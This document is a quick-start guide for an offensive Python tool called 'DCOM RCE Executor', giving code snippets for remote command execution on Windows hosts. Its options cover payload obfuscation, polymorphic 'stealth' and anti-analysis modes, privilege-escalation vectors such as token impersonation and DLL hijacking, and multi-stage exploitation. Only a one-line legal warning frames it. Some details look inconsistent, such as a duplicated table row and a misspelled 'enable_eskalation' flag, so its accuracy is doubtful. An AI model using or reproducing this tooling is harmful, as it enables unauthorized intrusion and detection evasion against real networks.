# DCOM RCE Executor - Quick Start Guide

## Installation

No external dependencies required - uses Python 3 standard library only.

```bash
python3 -c "import sys; print(sys.version)"  # Python 3.7+
```

## Basic Usage (30 seconds)

```python
from dcom_rce_executor import create_dcom_executor

# Create executor
executor = create_dcom_executor("192.168.1.100")

# Execute command
result = executor.execute_remote_command("whoami")

# Check result
print(f"Success: {result['success']}")
print(f"Command: {result['command']}")
```

## Common Scenarios

### 1. Execute with Credentials

```python
executor = create_dcom_executor(
    "192.168.1.100",
    auth_method="NTLM",
    username="Administrator",
    password="Password123!",
    domain="CORP"
)
result = executor.execute_remote_command("systeminfo")
```

### 2. Obfuscated Execution

```python
from dcom_rce_executor import ObfuscationTechnique

executor = create_dcom_executor(
    "192.168.1.100",
    enable_obfuscation=True,
    obfuscation_methods=[
        ObfuscationTechnique.BASE64_ENCODING,
        ObfuscationTechnique.XOR_CIPHER
    ]
)
result = executor.execute_remote_command("calc.exe")
```

### 3. Stealth Execution

```python
executor = create_dcom_executor(
    "192.168.1.100",
    enable_obfuscation=True,
    enable_polymorphism=True,
    enable_anti_analysis=True
)
result = executor.execute_stealth_command("whoami")
```

### 4. Privilege Escalation

```python
from dcom_rce_executor import PrivilegeEscalationVec

executor = create_dcom_executor(
    "192.168.1.100",
    enable_eskalation=True,
    escalation_vec=PrivilegeEscalationVec.TOKEN_IMPERSONATION
)
result = executor.execute_remote_command("whoami /priv")
```

### 5. Multi-Stage Exploitation

```python
executor = create_dcom_executor("192.168.1.100")

# Stage 1
r1 = executor.execute_remote_command("whoami")

# Stage 2
r2 = executor.execute_remote_command("systeminfo")

# Stage 3
r3 = executor.execute_remote_command("tasklist")

# Get report
report = executor.get_execution_report()
print(f"Total executions: {report['total_executions']}")
```

## DCOM Object Classes

| Class | Use Case |
|-------|----------|
| WMI_LOCATOR | General purpose, most reliable |
| EXCEL_APPLICATION | Office exploitation |
| WORD_APPLICATION | Office exploitation |
| MMC_APPLICATION | Admin console |
| SHELL_WINDOWS | Shell execution |
| SHELL_WINDOWS | Process execution |

```python
from dcom_rce_executor import DCOMObjectClass

executor = create_dcom_executor(
    "192.168.1.100",
    dcom_class=DCOMObjectClass.WMI_LOCATOR
)
```

## Authentication Methods

| Method | Requires |
|--------|----------|
| NTLM | Username + Password |
| KERBEROS | Domain + Username + Password |
| NEGOTIATE | Auto-select (tries Kerberos, falls back to NTLM) |
| NONE | Anonymous |
| IMPERSONATION | Existing tokens |
| DELEGATION | Domain setup |

```python
from dcom_rce_executor import AuthenticationMethod

executor = create_dcom_executor(
    "192.168.1.100",
    auth_method=AuthenticationMethod.NEGOTIATE
)
```

## Obfuscation Techniques

```python
from dcom_rce_executor import ObfuscationTechnique

techniques = [
    ObfuscationTechnique.BASE64_ENCODING,      # Basic encoding
    ObfuscationTechnique.HEX_ENCODING,         # Hex conversion
    ObfuscationTechnique.XOR_CIPHER,           # XOR encryption
    ObfuscationTechnique.RC4_CIPHER,           # RC4 encryption
    ObfuscationTechnique.POLYGLOT_ENCODING,    # Multiple encodings
    ObfuscationTechnique.POLYMORPHIC_TRANSFORM, # Random transform
    ObfuscationTechnique.DEAD_CODE_INJECTION,  # Insert junk code
    ObfuscationTechnique.CONTROL_FLOW_FLATTEN, # Flatten logic
    ObfuscationTechnique.STRING_OBFUSCATION,   # Encode strings
    ObfuscationTechnique.JUNK_API_CALLS,       # Add dummy API calls
]
```

## Privilege Escalation Vectors

```python
from dcom_rce_executor import PrivilegeEscalationVec

vectors = [
    PrivilegeEscalationVec.PROCESS_INJECTION,
    PrivilegeEscalationVec.TOKEN_IMPERSONATION,
    PrivilegeEscalationVec.KERNEL_CALLBACK,
    PrivilegeEscalationVec.DLL_HIJACKING,
    PrivilegeEscalationVec.REGISTRY_ELEVATION,
    PrivilegeEscalationVec.SERVICE_EXPLOITATION,
    PrivilegeEscalationVec.SCHEDULED_TASK,
    PrivilegeEscalationVec.COM_MARSHALLING,
]
```

## Execution Result Structure

```python
result = executor.execute_remote_command("whoami")

# Result contains:
{
    'success': True,                    # Execution status
    'payload_id': 'uuid-string',        # Unique payload ID
    'target_host': '192.168.1.100',     # Target host
    'target_port': 135,                 # Target port
    'dcom_object': 'WMI_LOCATOR',       # DCOM object used
    'method': 'Execute',                # Method called
    'command': 'whoami',                # Original command
    'obfuscated': True,                 # If obfuscated
    'obfuscation_methods': 'base64|xor',# Obfuscation chain
    'auth_method': 'NEGOTIATE',         # Auth method
    'marshalled_size': 2048,            # Payload size
    'timestamp': '2024-01-15T10:30:00', # Execution time
    'escalation': {...}                 # Escalation info (if enabled)
}
```

## Execution Report

```python
report = executor.get_execution_report()

# Report contains:
{
    'total_executions': 5,              # Number of commands
    'target_host': '192.168.1.100',     # Target
    'target_port': 135,                 # Port
    'dcom_object': 'WMI_LOCATOR',       # DCOM object
    'auth_method': 'NEGOTIATE',         # Auth method
    'connection_established': True,     # Connection status
    'executions': [...],                # List of all executions
    'average_payload_size': 2048        # Average size
}
```

## Testing

```bash
# Run all tests
python3 test_dcom_rce_executor.py

# Run specific test class
python3 -m unittest test_dcom_rce_executor.TestDCOMExecutor -v

# Run specific test
python3 -m unittest test_dcom_rce_executor.TestDCOMExecutor.test_remote_command_execution -v
```

## Examples

Run all 15 working examples:

```bash
python3 dcom_rce_executor_examples.py
```

Examples include:
1. Basic execution
2. Authenticated execution
3. Multiple DCOM classes
4. Authentication methods
5. Obfuscation techniques
6. Multi-layer obfuscation
7. Privilege escalation vectors
8. Polymorphic execution
9. Stealth execution
10. Multi-stage exploitation
11. Execution reporting
12. Custom configuration
13. Payload creation
14. Long-running commands
15. Error handling

## Configuration Template

```python
from dcom_rce_executor import DCOMConfig, DCOMExecutor

config = DCOMConfig(
    target_host="192.168.1.100",           # Required
    target_port=135,                        # Default: 135
    dcom_class=DCOMObjectClass.WMI_LOCATOR, # Default: WMI_LOCATOR
    auth_method=AuthenticationMethod.NTLM,  # Default: NEGOTIATE
    username="Administrator",               # Optional
    password="Password123!",                # Optional
    domain="CORP",                          # Optional
    enable_obfuscation=True,                # Default: True
    enable_eskalation=False,                # Default: False
    enable_polymorphism=True,               # Default: True
    connectivity_test=False,                # Default: False
    timeout_ms=30000,                       # Default: 30000
    retry_attempts=3                        # Default: 3
)

executor = DCOMExecutor(config)
result = executor.execute_remote_command("whoami")
```

## Performance Tips

1. **Disable unnecessary features** for speed:
   ```python
   executor = create_dcom_executor(
       "192.168.1.100",
       enable_obfuscation=False,  # Skip if not needed
       connectivity_test=False    # Skip connectivity checks
   )
   ```

2. **Use single obfuscation** for speed:
   ```python
   executor = create_dcom_executor(
       "192.168.1.100",
       obfuscation_methods=[ObfuscationTechnique.BASE64_ENCODING]
   )
   ```

3. **Cache executor instance**:
   ```python
   executor = create_dcom_executor("192.168.1.100")
   
   # Reuse for multiple commands
   for cmd in commands:
       result = executor.execute_remote_command(cmd)
   ```

## Troubleshooting

### Connection Failed
- Verify target is online: `ping 192.168.1.100`
- Check port 135 is open: `nmap -p 135 192.168.1.100`
- Verify DCOM is enabled on target

### Authentication Failed
- Check credentials: `net user Administrator /domain`
- Verify domain: `echo %userdomain%`
- Try NONE auth method for anonymous access

### Execution Failed
- Check if DCOM object class is installed
- Verify Windows version compatibility
- Check process permissions

## Security Notes

⚠️ **LEGAL WARNING**
- Only use with explicit authorization
- Unauthorized computer access is illegal
- For authorized penetration testing only

## Performance Metrics

- Payload creation: <1ms
- Marshalling: <1ms
- Obfuscation (single): <10ms
- Connection: <500ms
- Execution: <1000ms
- Average roundtrip: 1-2 seconds

## Documentation

- `DCOM_RCE_EXECUTOR_DOCUMENTATION.md` - Complete API reference
- `DCOM_RCE_EXECUTOR_SUMMARY.txt` - Technical overview
- `dcom_rce_executor_examples.py` - 15 working examples
- `test_dcom_rce_executor.py` - Test suite with 50 tests

## Additional Resources

- [Microsoft DCOM Documentation](https://docs.microsoft.com/en-us/windows/win32/com/dcom-security)
- [ORPC Protocol Specification](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/)
- [Windows RPC Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/)

---

**For more information, see DCOM_RCE_EXECUTOR_DOCUMENTATION.md**
